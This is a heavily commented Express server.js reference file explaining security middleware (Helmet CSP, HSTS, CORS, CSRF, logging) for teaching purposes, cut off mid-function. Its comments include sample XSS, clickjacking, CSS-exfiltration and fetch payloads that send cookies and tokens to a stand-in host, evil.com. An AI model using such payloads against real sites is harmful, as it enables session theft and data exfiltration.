// ============================================================
// SERVER.JS — VERBOSE REFERENCE COPY
// ============================================================
// This is a complete, working copy of server.js with full
// detailed comments and concrete attack examples for every
// security setting. Keep it as a study reference.
// The actual server.js has the concise version of these comments.
// ============================================================

// EXTERNAL LOGGING PACKAGE (supposed to come first, before even Express)
import * as Sentry from '@sentry/node'

// BACKEND FRAMEWORK (for creating a server that can handle API requests, connect to a database, etc.)
// (defines routes, handles authentication, processes data for the frontend)
import express from 'express'

// MIDDLEWARE (packages that help with security, logging, etc)
// Used in a particular order, as needed:
// SECURITY:
import helmet from 'helmet'                   // sets secure HTTP headers
import cors from 'cors'                       // configures CORS for cross-origin requests
import cookieParser from 'cookie-parser'      // parses cookies from incoming requests
import { csrfProtection } from './custom-middleware/csrf-protection.js'  // custom CSRF protection middleware (enforces sameSite, Sec-Fetch-Site, Origin, and custom header checks)
import passport from './config/passport.js';  // manages OAuth strategies (Google, Facebook, Twitter login)
// LOGGING:
import logger from './config/logger.js'       // structured logging with Pino (sends logs to Sentry and production log services)
import pinoHttp from 'pino-http'              // Express middleware for Pino logging (logs each HTTP request in JSON format for Sentry/production logs)
import morgan from 'morgan'                   // HTTP request logger (colorized for development, Apache format for production)
// UTILITIES:
import compression from 'compression';        // gzips response bodies to reduce bandwidth (not a security layer, but improves performance)
import path from 'path'                       // for working with file and directory paths (serving React in production)
import { fileURLToPath } from 'url'           // for getting __dirname in ES modules (serving React in production)
import fs from 'fs'                           // for checking if the React build folder exists (serving React in production)
// ERROR HANDLING:
import errorhandler from 'errorhandler'       // development-only error handler that shows stack traces in the terminal (never used in production)
import createError from 'http-errors'         // for creating HTTP error objects (e.g. 404 Not Found) in our error handlers
// ADDITIONAL MIDDLWARE used below that didn't need imports:
    // our custom headers
    // .json() body parser
    // our custom CSRF protection


// ROUTES PLACED IN SEPARATE FILES TO HELP KEEP THINGS ORGANIZED
import welcomeRouter from './routes/welcome-router.js';
import usersRouter from './routes/users-router.js';
import contentRouter from './routes/content-router.js';
import authRouter from './routes/auth-router.js';
import oauthRouter from './routes/oauth-router.js';
import healthRouter from './routes/health-router.js';


// SETTING UP THE SERVER
const app = express()
const PORT = process.env.PORT || 3000


// GAUNTLET OF MIDDLWARE (there are LOTS!). For:
    // 1. Security hardening (headers, CORS, CSRF)
          // a) Trust proxy - needed for (correct IP logging and rate limiting, for) Vercel/Replit deployments
          // a) ADDING HEADERS TO NARROW KNOWN VULNERABILITIES:
                // i. Helmet - addresses CSP, clickjacking, MIME sniffing, HSTS
                // ii. Custom headers - addresses legacy XSS protection, referrer policy, permissions policy
          // b) IP ADDRESS NARROWING:
                // CORS - set to allow only our frontend origin
          // d) CUSTOM Custom CSRF PROTECTION

                // NEED TO TAKE A CLOSER LOOK AT THIS
                // NOT SURE WHAT CLAUDE PUT TOGETHER

                // middleware that enforces sameSite, Sec-Fetch-Site, Origin, and custom header checks

    // 2. Logging (audit trail & incident detection)
          // a) Pino - needed for Sentry? (CAN HAVE AS MUCH OR AS LITTLE AS YOU CHOOSE)
          // b) Morgan - all the details of each HTTP request (method, path, status code, response time) in the terminal for development; Apache format (with IP and user-agent) for production (can be used for security audits and detecting suspicious activity)
    // 3. Speed/Performance
          // a) compression - gzips response bodies to reduce bandwidth
    // 4. Utilities needed to interact with file system, so the frontend can be built for production
          // a) path
          // b) fileURLToPath
          // c) fs
    // 5. Error handling (Sentry + custom handlers)
          // a) Sentry error handler - captures errors and sends them to your Sentry dashboard
          // b) Sentry fallthrough handler - attaches a Sentry error ID to the response so users can quote it when reporting a problem
          // c) Development-only detailed error output (listed in the terminal)
          // d) Catch undefined routes — turns a "no route matched" into a proper 404 error object
          // e) Final catch-all — handles any error that slipped through the above handlers and returns a clean JSON response without stack traces (to avoid


// PROXY TRUST
// ─────────────────────────────────────────────────────────────────
// WHY THIS EXISTS:
// Our app runs behind a reverse proxy (Vercel/Render). Without this setting,
// Express sees the PROXY's IP address on every request instead of the real
// client's IP. That means rate-limiting would think all users share one IP
// and would throttle your entire app after the first few requests.
//
// HOW IT WORKS:
// Vercel/Render add the real client IP to the X-Forwarded-For header before
// forwarding the request to Express. trust proxy: 1 tells Express to read
// that header — but only trust ONE hop back (the proxy itself). Without it,
// Express ignores the header entirely and sees only the proxy's IP.
//
// Why "1" and not "true"?
// If you set trust proxy: true, Express trusts the ENTIRE X-Forwarded-For
// chain — including anything the client sent before it reached Vercel.
//
// Attack example (IP spoofing with trust proxy: true):
//   POST /api/users/login HTTP/1.1
//   Host: yoursite.com
//   X-Forwarded-For: 1.2.3.4, attacker-real-ip
//
// The attacker manually pre-stuffs a fake IP (1.2.3.4) into the header.
// With trust proxy: true, Express believes 1.2.3.4 is the client — the
// attacker's real IP is ignored. Their rate limit counter resets every time
// they swap in a new fake IP, so they can hammer your login endpoint forever.
//
// With trust proxy: 1, Express only trusts what Vercel/Render added (one hop),
// not what the attacker stuffed in before it. The real IP is used, and rate
// limiting works correctly.
//
// DOES THIS *CATCH* SPOOFING?
// Not exactly — it doesn't block anything on its own. It makes sure Express
// reads the correct IP so that YOUR rate limiter can do its job accurately.
// Think of it as a prerequisite for rate limiting to work, not a defence itself.
//
// CAN'T AN ATTACKER JUST USE A VPN?
// Yes — and that's an important caveat. IP-based rate limiting stops cheap,
// automated attacks (a script hammering your login 10,000 times costs nothing).
// It doesn't stop a determined attacker willing to rotate VPNs. Each VPN switch
// adds friction — reconfigure, reconnect, restart — and most bots aren't that
// persistent. They move on to easier targets. Rate limiting is one layer in a
// stack, not a complete solution. The clever attacker can work around it; the
// lazy automated script cannot.
// ─────────────────────────────────────────────────────────────────
app.set('trust proxy', 1)


// HTTP SECURITY HEADERS — HELMET
// (CONTENT SECURITY POLICY, FRAMEGUARD, NOSNIFF, HSTS)
// ─────────────────────────────────────────────────────────────────
// SECURITY ISSUES ADDRESSED:
//
//  • XSS (Cross-Site Scripting) — three variations, all addressed by Helmet's CSP:
//
//    1. Stored XSS: attacker saves a malicious script to your database; it runs
//       in every other user's browser when they view that content.
//       Example: they submit a comment containing:
//       <script>document.location='https://evil.com/?c='+document.cookie</script>
//       Every user who views that comment silently has their cookie stolen.
//
//    2. Reflected XSS: malicious script is embedded in a URL (e.g. a phishing link);
//       the server echoes it back in the HTML response and it runs on page load.
//       Example: https://yoursite.com/search?q=<script>stealCookies()</script>
//       If the server puts that query param directly into the HTML, it executes.
//
//    3. DOM-based XSS: happens entirely in the browser — JS reads from the URL or
//       DOM and writes it unsafely back into the page (no server involved).
//       React's JSX auto-escaping largely prevents this, but CSP is the backstop.
//
//    CONTENT SECURITY POLICY (CSP) is the neutralizer for all three: even if a
//    malicious script tag somehow made it into the page, the browser refuses to run
//    it if it's not on the whitelist ...
//
//    The whitelist IS the list of directives in the contentSecurityPolicy block below.
//    Each directive is a rule for one type of resource — scripts, images, fonts, etc.
//    Ours currently allows:
//      • Scripts from:  our own server, google.com, gstatic.com (reCAPTCHA)
//      • Images from:   our own server, gstatic.com (reCAPTCHA)
//      • Fonts from:    our own server only
//      • Frames from:   google.com only (reCAPTCHA iframe)
//      • API calls to:  our own server, google.com (reCAPTCHA verification)
//      • Styles from:   our own server only
//      • Forms post to: our own server only
//      • Everything else: our own server only (default-src fallback)
//    Anything not on that list — including any script an attacker injected that
//    tries to load from evil.com — gets refused by the browser before it runs.
//
//    ⚠ IMPORTANT — THIS WHITELIST NEEDS MANUAL UPDATES:
//    Any time you add a new third-party service (Google Fonts, Stripe, analytics,
//    maps, video embeds, etc.), you MUST add its domain(s) to the relevant
//    directive(s) below or the browser will silently block it. The browser's
//    dev tools console will show a CSP violation error naming the exact directive
//    and URL that was blocked — that's your signal to update the whitelist here.
//
// (See input-validators.js for the input-level defences against stored/reflected XSS,
//    and React's automatic escaping for DOM-based XSS.)
//
//  • Clickjacking: A malicious site embeds your app in a hidden <iframe> and tricks
//    users into clicking things they can't see.
//    Example: attacker's page has a big "Claim Your Prize!" button. Behind it,
//    invisible, is your app's "Delete Account" button inside an iframe — positioned
//    so the click lands on it. The user's authenticated session does the rest.
//    Attack code on evil.com:
//      <style>
//        iframe { opacity: 0; position: absolute; top: 0; left: 0;
//                 width: 100%; height: 100%; z-index: 999; }
//        .bait { position: absolute; top: 210px; left: 150px; z-index: 1; }
//      </style>
//      <iframe src="https://yoursite.com/settings"></iframe>
//      <button class="bait">🎉 You won! Click to claim your prize!</button>
//    frame-ancestors: 'none' and X-Frame-Options: DENY tell browsers to refuse
//    to load your app inside any iframe at all — so the iframe above never renders.
//
//  • MIME Sniffing: Browsers sometimes guess a file's type even if the server says
//    otherwise. An attacker uploads "photo.jpg" whose actual content is JavaScript.
//    The server says Content-Type: image/jpeg, but the browser sniffs the bytes,
//    decides it looks like JS, and executes it. noSniff: true tells the browser:
//    "Trust the Content-Type header. Never guess."
//    Attack: attacker uses your app's file upload feature to upload this as "photo.jpg":
//      <script>
//        document.location = 'https://evil.com/?c=' + document.cookie
//      </script>
//    Without noSniff, an old browser runs it as JavaScript when the "image" loads.
//    With noSniff, the browser sees Content-Type: image/jpeg and treats it as a
//    broken image — the script never executes.
//
//  • HTTPS Downgrade Attacks / SSL-Strip (HSTS): On public Wi-Fi, an attacker can
//    intercept your initial HTTP request (before it redirects to HTTPS) and strip
//    the SSL upgrade — keeping you on unencrypted HTTP so they can read your traffic.
//    Attack (using a tool like sslstrip on the same WiFi network):
//      User types: yoursite.com               ← browser sends plain HTTP request
//      Attacker intercepts it, forwards to your server over HTTPS (server is happy)
//      Attacker rewrites the 301 redirect response, removing the HTTPS upgrade
//      User stays on http://yoursite.com      ← all traffic now readable in plain text
//      Attacker reads: Cookie: token1=eyJhbGc...  ← session token stolen
//    With HSTS, after the user's first visit the browser remembers "always use HTTPS"
//    and upgrades the request internally — the initial HTTP request never goes out,
//    so the attacker has nothing to intercept.
//    Strict-Transport-Security tells browsers to ALWAYS use HTTPS for this domain,
//    upgrading internally before any request leaves the browser.
//
// Helmet sets all of these headers automatically on every response.
// ─────────────────────────────────────────────────────────────────


app.use(helmet({

  // ── CONTENT SECURITY POLICY (CSP) ───────────────────────────────
  // CSP is a whitelist you send to the browser: "here are the ONLY places
  // this page is allowed to load things from." If a script/image/font isn't
  // on the list, the browser refuses to load it — even if an attacker managed
  // to inject a reference to their malicious server into your HTML.
  //
  // Think of it like a guest list at a venue: the bouncer (browser) only lets
  // in sources you've pre-approved. Anything else gets turned away at the door.
  //
  // Each directive below controls a different TYPE of resource:
  contentSecurityPolicy: {
    directives: {

      // default-src: the fallback rule for any resource type not listed below.
      // 'self' means "only from this exact domain" — no CDNs, no other sites.
      // If you don't explicitly set script-src, font-src, etc., they all fall
      // back to this. It's your safety net.
      // Attack example: an attacker injects any tag that tries to load from outside
      // your domain — say a tracking pixel or a stylesheet — and it hits this rule:
      //   <img src="https://evil.com/tracker.gif">           ← blocked by default-src
      //   <link rel="stylesheet" href="https://evil.com/x">  ← blocked by default-src
      // Without this fallback, anything not explicitly listed would be allowed.
      "default-src": ["'self'"],

      // base-uri: controls what URLs are allowed in a <base> tag.
      // A <base> tag changes the base URL for all relative links on the page.
      // Attack example:
      //   <base href="https://evil.com">
      // Now every relative link on your page — like /api/login or /reset-password —
      // resolves to evil.com/api/login instead of your real server. The user
      // unknowingly sends their credentials straight to the attacker.
      // 'self' blocks any injected <base> pointing outside your own domain.
      "base-uri": ["'self'"],

      // font-src: controls where fonts can be loaded from.
      // 'self' = only fonts served by your own server.
      // Attack example: an attacker injects a stylesheet that loads a font from
      // their server. While fonts themselves can't run code, a malicious font
      // request leaks that the page loaded (a tracking technique), and if
      // 'data:' were allowed, base64-encoded payloads could be smuggled through.
      //   <style>@font-face { src: url('https://evil.com/track.woff2') }</style>
      // Note: 'data:' (inline base64 fonts) was removed — our app doesn't use any.
      //
      // ── ADDING GOOGLE FONTS ──────────────────────────────────────
      // If you add a Google Font via <link> in index.html, you'll need to
      // update TWO directives — Google Fonts loads in two separate steps:
      //
      //   Step 1: browser fetches a CSS stylesheet from fonts.googleapis.com
      //           (this contains the @font-face rules) → add to style-src
      //   Step 2: that stylesheet fetches the actual font files from fonts.gstatic.com
      //           → add to font-src
      //
      // Updated directives would look like:
      //   "font-src":  ["'self'", "https://fonts.gstatic.com"],
      //   "style-src": ["'self'", "https://fonts.googleapis.com"],
      //
      // And in your index.html <head>:
      //   <link rel="preconnect" href="https://fonts.googleapis.com">
      //   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      //   <link href="https://fonts.googleapis.com/css2?family=YourFont&display=swap" rel="stylesheet">
      //
      // GENERAL RULE: any time you add a new third-party resource (fonts, analytics,
      // maps, payment widgets, etc.), check whether it needs a new CSP entry.
      // The browser will tell you in dev tools — look for a CSP violation error in
      // the console. It names the exact directive that blocked it and the exact URL
      // that was refused, so it's easy to diagnose and fix.
      "font-src": ["'self'"],

      // frame-src: controls which URLs are allowed inside <iframe> tags on YOUR page.
      // reCAPTCHA v2 works by loading a Google iframe (the checkbox widget).
      // Without this, the browser blocks the iframe and reCAPTCHA never appears.
      // Attack example (what this prevents against untrusted iframes):
      //   <iframe src="https://evil.com/phishing-form"></iframe>
      // If 'frame-src' were wide open, an attacker could inject an iframe that
      // loads a convincing fake login form inside your real page.
      "frame-src": ["https://www.google.com"],

      // frame-ancestors: controls which sites are allowed to embed YOUR page in an iframe.
      // 'none' means NO site can put your app in an iframe — not even yourself.
      // Attack example (clickjacking):
      //   <!-- on evil.com -->
      //   <iframe src="https://yoursite.com/settings"
      //           style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%">
      //   </iframe>
      //   <button style="position:absolute; top:200px; left:300px">Claim your prize!</button>
      // The user thinks they're clicking "Claim your prize!" but they're actually
      // clicking your invisible "Delete Account" button underneath. 'none' stops
      // your app from being embeddable at all — no iframe, no trick.
      // This is the modern, more powerful replacement for X-Frame-Options.
      "frame-ancestors": ["'none'"],

      // img-src: controls where images can be loaded from.
      // 'self' = your own server. gstatic.com = reCAPTCHA images.
      // Attack example: CSS-based cookie exfiltration via image requests —
      //   <img src="https://evil.com/steal?cookie=abc123">
      // Or more subtly, a 1x1 invisible tracking pixel injected into your page:
      //   <img src="https://evil.com/track?user=erika&page=settings" width="1" height="1">
      // Both are blocked because evil.com isn't on the img-src whitelist.
      // Note: 'data:' (base64 inline images) was removed — not needed, widens surface.
      "img-src": ["'self'", "https://www.gstatic.com"],

      // object-src: controls <object>, <embed>, and <applet> tags — the old HTML
      // elements used to load Flash (.swf), Java applets, Silverlight, and ActiveX.
      // These technologies are dead, but they were historically devastating —
      // Flash alone was responsible for a huge share of browser-based malware.
      // Attack example:
      //   <object data="https://evil.com/exploit.swf" type="application/x-shockwave-flash">
      //   </object>
      // The Flash file runs in the browser with broad permissions, installs malware,
      // or steals session data. 'none' blocks all of these tags entirely.
      "object-src": ["'none'"],

      // script-src: THE most critical directive — controls which JavaScript can run.
      // This is your primary XSS defense at the browser level.
      // 'self' = only scripts from your own server.
      // google.com + gstatic.com = required for reCAPTCHA's JS bundle.
      //
      // Attack example (what gets blocked):
      //   <script src="https://evil.com/steal-cookies.js"></script>
      //   <script>document.location='https://evil.com/?c='+document.cookie</script>
      //
      // The first is blocked because evil.com isn't on the whitelist.
      // The second is blocked because we do NOT include 'unsafe-inline' — that flag
      // would allow any <script>...</script> block written directly into the HTML
      // to execute. Without it, even a successfully injected inline script is
      // dead on arrival — the browser refuses to run it.
      //
      // We also omit 'unsafe-eval', which would allow:
      //   eval("fetch('https://evil.com/?c='+document.cookie)")
      //   new Function('return document.cookie')()
      // Both convert string data into executable code — a common post-injection trick.
      "script-src": ["'self'", "https://www.google.com", "https://www.gstatic.com"],

      // script-src-attr: controls inline JavaScript event handlers in HTML attributes.
      // Attack example: attacker injects HTML but can't use a <script> tag (blocked
      // by script-src above), so they try hiding code in an event handler instead:
      //   <img src="x" onerror="fetch('https://evil.com/?c='+document.cookie)">
      //   <a href="#" onclick="document.location='https://evil.com/?c='+document.cookie">
      //   <button onmouseover="stealSessionToken()">Hover me</button>
      // 'none' blocks all inline event handlers. React doesn't use them anyway —
      // it attaches events with addEventListener under the hood — so no cost to us.
      "script-src-attr": ["'none'"],

      // style-src: controls where CSS can be loaded from.
      // We don't include 'unsafe-inline', which would allow injected <style> blocks.
      // CSS injection sounds harmless but can leak data:
      // Attack example (CSS-based form data exfiltration):
      //   <style>
      //     input[name="creditCard"][value^="4"] {  /* if card starts with 4... */
      //       background: url('https://evil.com/leak?digit=4');  /* ...ping their server */
      //     }
      //     input[name="creditCard"][value^="5"] {
      //       background: url('https://evil.com/leak?digit=5');
      //     }
      //   </style>
      // By iterating through every possible character, an attacker can reconstruct
      // what the user is typing — one character at a time — without any JavaScript.
      "style-src": ["'self'"],

      // connect-src: controls where JS can make network requests
      // (fetch, XMLHttpRequest, WebSockets, EventSource).
      // Attack example: an attacker injects a script that tries to exfiltrate data:
      //   fetch('https://evil.com/steal', {
      //     method: 'POST',
      //     body: JSON.stringify({ cookie: document.cookie, token: localStorage.token })
      //   })
      // Without connect-src, this fetch would be blocked by CSP before it even sends.
      // google.com is whitelisted because reCAPTCHA's JS must POST the token to
      // Google's siteverify API to confirm the user isn't a bot.
      "connect-src": ["'self'", "https://www.google.com"],

      // media-src: controls <audio> and <video> source URLs.
      // Attack example: attacker injects a video tag pointing to their server —
      //   <video src="https://evil.com/track?user=erika" autoplay muted></video>
      // Even without playing anything, the browser makes a request to that URL,
      // leaking that this user visited this page (tracking/fingerprinting).
      // 'self' means media can only come from our own server.
      "media-src": ["'self'"],

      // form-action: controls where HTML <form> elements are allowed to submit.
      // Attack example: attacker injects a hidden form into your page:
      //   <form action="https://evil.com/harvest" method="POST">
      //     <input type="hidden" name="token" value="...stolen from DOM...">
      //   </form>
      //   <script>document.forms[0].submit()</script>
      // When the form submits, the user's data (including any values the attacker
      // could read from the DOM) goes directly to the attacker's server.
      // 'self' means forms may only POST to your own domain — evil.com is blocked.
      "form-action": ["'self'"]
    },
  },

  // ── FRAMEGUARD (X-Frame-Options) ────────────────────────────────
  // The older way to prevent clickjacking (see frame-ancestors above).
  // frame-ancestors in CSP is more powerful, but X-Frame-Options is
  // kept as a fallback for older browsers that don't support CSP.
  //
  // Attack example (what this stops on browsers that don't support CSP):
  //   <!-- on evil.com -->
  //   <style>
  //     iframe { opacity: 0; position: absolute; top: 0; left: 0;
  //              width: 100%; height: 100%; z-index: 999; }
  //     button { position: absolute; top: 210px; left: 150px; }
  //   </style>
  //   <iframe src="https://yoursite.com/settings"></iframe>
  //   <button>You just won a free iPhone! Click to claim!</button>
  //
  // The user sees the "free iPhone" button. They click it. Behind it, invisible,
  // is your app's "Delete Account" confirmation button — at the exact same pixel
  // coordinates. Their authenticated session does the rest.
  //
  // X-Frame-Options: DENY tells the browser: refuse to render this page inside
  // any iframe, ever. The clickjacking overlay can't be built because the
  // iframe itself never loads.
  // "deny" = nobody can embed this page in an iframe, period.
  frameguard: {
    action: "deny",
  },

  // ── NOSNIFF (X-Content-Type-Options) ────────────────────────────
  // Prevents "MIME sniffing" — where a browser ignores the Content-Type
  // header and tries to guess the file type itself.
  // Attack: attacker uploads "photo.jpg" whose actual bytes are JavaScript.
  // The server says Content-Type: image/jpeg, but the browser sniffs the file,
  // thinks "this looks like JS," and executes it. Their "image" is now running
  // code in your user's browser on your domain.
  // noSniff: true tells the browser: "trust the Content-Type, never guess."
  noSniff: true,

  // ── HSTS (Strict-Transport-Security) ────────────────────────────
  // Tells browsers: "This site ALWAYS uses HTTPS. Never try HTTP, even
  // if the user types http:// or clicks an old http:// link."
  //
  // Without HSTS, an attacker on the same network (coffee shop WiFi) can
  // run an SSL-strip attack:
  //   1. User types "yoursite.com" — browser sends an HTTP request.
  //   2. Attacker intercepts it (they're on the same WiFi).
  //   3. Attacker forwards it to your server over HTTPS (server is happy),
  //      but serves the response back to the user over plain HTTP.
  //   4. The user never gets the HTTPS redirect — they stay on HTTP.
  //   5. Everything they send, including session cookies, travels in plain text.
  //   6. Attacker reads the cookie and logs in as the user.
  //
  // With HSTS, after one visit the browser remembers: "always use HTTPS for
  // this domain." The initial HTTP request never happens — the browser upgrades
  // internally before anything goes over the wire.
  //
  // maxAge: 31536000 = remember this rule for 1 year (in seconds)
  // includeSubDomains: apply the same rule to all subdomains
  // preload: opt into browsers' hardcoded HSTS list (protects even first-time visitors)
  //
  // We disable it in development because local dev runs on HTTP.
  hsts: process.env.NODE_ENV === 'production'
    ? { maxAge: 31536000, includeSubDomains: true, preload: true }
    : false,

}));


// ADDITIONAL CUSTOM SECURITY HEADERS
// ─────────────────────────────────────────────────────────────────
// SECURITY ISSUES ADDRESSED:
//
//  • X-XSS-Protection: Legacy browsers (IE, old Chrome) had a built-in XSS
//    filter that could sometimes be tricked into introducing vulnerabilities.
//    '1; mode=block' tells those browsers to block the page entirely if they
//    detect a reflected XSS attack instead of trying to sanitize it.
//    (Modern browsers use CSP instead — this is a fallback for older ones.)
//
//  • Referrer-Policy: When you click a link, browsers send a Referer header
//    to the new site showing where you came from. This can leak sensitive URL
//    parameters. Example: your password reset link is:
//    https://yoursite.com/reset?token=abc123
//    User visits that page, then clicks a link to an external site. Browser
//    sends: Referer: https://yoursite.com/reset?token=abc123
//    That external site now has the reset token in their server logs.
//    'no-referrer' tells the browser to send no Referer header at all.
//
//  • Permissions-Policy: Restricts which browser features this page is allowed
//    to use. Prevents a compromised script from quietly accessing hardware.
//    Example: a supply-chain attack corrupts an npm package in your build.
//    Without this, the malicious script could call navigator.geolocation or
//    getUserMedia() and silently access the user's location or microphone.
//    geolocation=() and microphone=() mean: nobody on this page may use these,
//    not even scripts from our own domain.
// ─────────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  res.set({
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'no-referrer',
    'Permissions-Policy': 'geolocation=(), microphone=()'
  });
  next();
});


// CORS — CROSS-ORIGIN RESOURCE SHARING
// ─────────────────────────────────────────────────────────────────
// SECURITY ISSUE: Cross-origin data theft
//
// By default, browsers enforce the Same-Origin Policy: JavaScript on one
// domain cannot read responses from a different domain. CORS is how a server
// opts INTO allowing specific cross-origin callers.
//
// Our frontend (localhost:5000 in dev, Vercel URL in prod) is a different
// origin from our backend (localhost:3000). Without CORS, every API call
// from the frontend would be blocked by the browser before our code even runs.
//
// We allow ONLY our known frontend origin. Any other site that tries to call
// our API will be blocked by the browser. An attacker at evil.com cannot
// read our API responses even if they send requests to it.
//
// Attack example — what an attacker on evil.com might try:
//   <!-- on evil.com -->
//   <script>
//     fetch('https://yoursite.com/api/users/profile', {
//       credentials: 'include'   // attacker tries to include your auth cookie
//     })
//     .then(res => res.json())
//     .then(data => {
//       // steal the user's profile data and send it to attacker's server
//       fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) })
//     })
//   </script>
//
// The browser sends the request and even attaches the user's cookie (because
// credentials: 'include'). But when the response comes back, the browser checks
// the Access-Control-Allow-Origin header. It says "http://localhost:5000" —
// not "https://evil.com". The browser refuses to give the response to the
// evil.com script. The attacker's fetch() gets a CORS error and never sees the data.
//
// IMPORTANT: CORS is enforced by the BROWSER — not the server. The server
// still receives and processes the request. CORS only blocks the attacker from
// READING the response. (CSRF protection handles blocking the request itself.)
//
// credentials: true is required so that the browser will include our
// httpOnly auth cookies when making cross-origin API calls from the frontend.
// Without it, fetch('/api/...', { credentials: 'include' }) would fail silently.
//
// Security note: credentials: true is ONLY safe because we explicitly
// whitelist our origin. origin: '*' + credentials: true is blocked by the
// browser spec entirely — that combination would be dangerously permissive.
// ─────────────────────────────────────────────────────────────────


app.use(cors({
  origin: process.env.ALLOWED_ORIGIN
    ? process.env.ALLOWED_ORIGIN.split(',')
    : ['http://localhost:5000'],
  credentials: true  // required for cookies to be sent cross-origin
}))


// BODY PARSING
// ─────────────────────────────────────────────────────────────────
// Not a security layer itself, but required for the server to read
// incoming JSON request bodies (e.g. { username, password } on login).
// JSON arrives as a raw string — express.json() parses it into a JS object
// so our controllers can use req.body.username instead of parsing manually.
// ─────────────────────────────────────────────────────────────────
app.use(express.json())


// COOKIE PARSER
// ─────────────────────────────────────────────────────────────────
// Required to read incoming cookies from requests.
// Our JWT (token1) and UUID refresh token (token2) arrive as httpOnly cookies.
// cookieParser reads them and puts them on req.cookies so our middleware
// can verify them. Think of it like express.json() but for cookies.
// ─────────────────────────────────────────────────────────────────


app.use(cookieParser())


// CSRF PROTECTION
// ─────────────────────────────────────────────────────────────────
// SECURITY ISSUE: Cross-Site Request Forgery (CSRF)
//
// Because we store our auth tokens in cookies, those cookies are automatically
// sent by the browser on EVERY request to our domain — including requests
// triggered by a malicious third-party website without the user's knowledge.
//
// Attack example: a shady site contains hidden HTML:
//   <form action="https://yoursite.com/api/users/delete-account" method="POST">
//     <input type="hidden" name="confirm" value="yes">
//   </form>
//   <script>document.forms[0].submit()</script>
// The browser loads the page, the form auto-submits, the browser attaches
// your cookies. Your server sees a valid authenticated POST and deletes the
// account. The user never clicked anything. That's CSRF.
//
// Our defence has four layers — see csrf-protection.js for the full explanation:
//   1. sameSite: 'lax' on cookies (set in createJWT/createUUID)
//      Tells the browser: only send this cookie on requests the user
//      initiated from our own site. Cross-site auto-submits don't get the cookie.
//   2. Sec-Fetch-Site header check (server-side enforcement)
//      Modern browsers include this header saying where the request came from.
//      We reject any state-changing request that says 'cross-site'.
//   3. Origin header check (fallback for older browsers)
//      Older browsers that don't send Sec-Fetch-Site still send an Origin
//      header on cross-origin POSTs. We check it matches our allowed origin.
//   4. X-Requested-With custom header
//      Our frontend always sends this custom header. Attackers can't forge
//      custom headers cross-site — the browser's CORS preflight blocks it.
//
// This middleware only applies to state-changing methods: POST, PUT, DELETE, PATCH.
// ─────────────────────────────────────────────────────────────────
app.use('/api', csrfProtection)


// PASSPORT — OAUTH INITIALIZATION
// ─────────────────────────────────────────────────────────────────
// Not a security layer itself — this is the OAuth strategy manager.
// passport.initialize() sets up Passport so it can handle OAuth flows
// (Google, Facebook, Twitter login). The actual security happens inside
// each OAuth strategy (verifying tokens with the provider, PKCE for Twitter).
// ─────────────────────────────────────────────────────────────────


app.use(passport.initialize())


// LOGGING MIDDLEWARE
// ─────────────────────────────────────────────────────────────────
// SECURITY BENEFIT: Audit trail & incident detection
//
// Logging every request isn't just for debugging — it's a security tool.
// If someone is probing your app for vulnerabilities (e.g. trying many
// endpoints, odd payloads, repeated failed logins), logs let you see it.
// In production, logs go to Sentry/Pino where they can trigger alerts.
//
//  • morgan: logs each HTTP request in the terminal (dev = colorized,
//    production = Apache "combined" format with IP + user-agent)
//  • pino-http: structured JSON logging for Sentry and production log services
// ─────────────────────────────────────────────────────────────────


app.use(pinoHttp({ logger }))

if (process.env.NODE_ENV === 'development') {
  app.use(morgan('dev'))       // concise, colorized output for development
} else {
  app.use(morgan('combined'))  // Apache format — includes IP, user-agent, referrer (better for analytics/security audits)
}


// RESPONSE COMPRESSION
// ─────────────────────────────────────────────────────────────────
// Not a security layer — this gzips response bodies to reduce bandwidth.
// Smaller responses = faster load times for users.
// ─────────────────────────────────────────────────────────────────


app.use(compression());


// PRODUCTION BUILD — SERVE REACT APP
// ─────────────────────────────────────────────────────────────────
// When deployed, Vercel/Render build the React app into /public.
// Express serves those static files directly so the browser gets
// the frontend without needing a separate Vite dev server.
// ─────────────────────────────────────────────────────────────────


const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

const publicPath = path.join(__dirname, '../public')
const serveReactApp = fs.existsSync(publicPath)

if (serveReactApp) {
  app.use(express.static(publicPath))
}


// SENTRY TEST ROUTE — uncomment to trigger a test error at /api/debug-sentry
// app.get("/api/debug-sentry", function mainHandler(req, res) {
//   throw new Error("My first Sentry error!");
// });


// ROUTES
// ─────────────────────────────────────────────────────────────────
// All routes live under /api so they're clearly separated from static
// frontend files. Each router handles its own sub-routes internally.
// ─────────────────────────────────────────────────────────────────
app.use('/api', welcomeRouter);
app.use('/api', usersRouter);
app.use('/api', contentRouter);
app.use('/api', authRouter);
app.use('/api', oauthRouter);
app.use('/api', healthRouter);


// SIMPLE HELLO ROUTE
// (kept here as an example of a direct route with caching)
app.get('/api/hello', (req, res) => {
  res.set('Cache-Control', 'public, max-age=60')  // tell browsers to cache this for 60s — it's the same for every user
  res.status(200).json({ message: 'Hello from the backend!' })
});


// ERROR CATCH-ALL
// ─────────────────────────────────────────────────────────────────
// React Router handles navigation on the frontend. If a user hits a URL
// like /profile directly (page refresh or bookmark), the browser asks
// the server for that path — but Express doesn't have a /profile route.
// This catch-all sends back index.html for any non-API path, so React
// Router can take over and show the right page.
// ─────────────────────────────────────────────────────────────────
if (serveReactApp) {
  app.get('/{*path}', (req, res, next) => {
    if (req.path.startsWith('/api')) {
      return next()  // don't intercept API routes — let them fall through to error handlers
    }
    res.sendFile(path.join(publicPath, 'index.html'))
  })
}


// ERROR HANDLERS
// ─────────────────────────────────────────────────────────────────
// SECURITY BENEFIT: Avoid leaking stack traces to users
//
// In production, never send raw error details (stack traces, file paths,
// database error messages) to the client — attackers can use them to map
// your system. Our error handlers catch all unhandled errors and return
// clean JSON responses instead.
//
// Order matters: Sentry must come before other error handlers so it can
// capture the full error before we send a response and close the request.
// ─────────────────────────────────────────────────────────────────

// Sentry error handler (captures errors and sends them to your Sentry dashboard)
Sentry.setupExpressErrorHandler(app)

// Sentry fallthrough handler (attaches a Sentry error ID to the response
// so users can quote it when reporting a problem)
app.use(function onError(err, req, res) {
  res.statusCode = 500;
  res.end(res.sentry + "\n");
});


// Development-only detailed error output (stack traces visible in terminal — never in production)
if (process.env.NODE_ENV === 'development') {
  app.use(errorhandler())
}

// #2: Catch undefined routes — turns a "no route matched" into a proper 404 error object
app.use((req, res, next) => {
